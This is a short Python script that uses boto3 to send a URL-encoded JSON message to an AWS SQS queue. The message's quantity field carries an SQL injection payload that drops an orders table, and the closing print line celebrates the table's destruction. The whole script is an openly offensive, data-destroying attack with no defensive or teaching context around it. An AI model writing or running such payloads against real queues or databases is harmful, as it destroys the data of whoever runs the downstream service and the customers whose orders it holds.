import boto3
import json
import urllib.parse

# Initialize the SQS client
sqs = boto3.client('sqs', region_name='REGION')

# Set the SQS queue URL
queue_url = 'SQLURL'

# Define the payload
payload = {
    "user_id": "user123",
    "product_id": "product456",
    "quantity": "1; DROP TABLE orders; --"
}

# Convert the payload to a JSON string
json_payload = json.dumps(payload)

# URL encode the JSON string
encoded_payload = urllib.parse.quote(json_payload)

# Send the message to the SQS queue
response = sqs.send_message(
    QueueUrl=queue_url,
    MessageBody=encoded_payload
)

print(f"Message sent and orders table destroyed! MessageId: {response['MessageId']}")
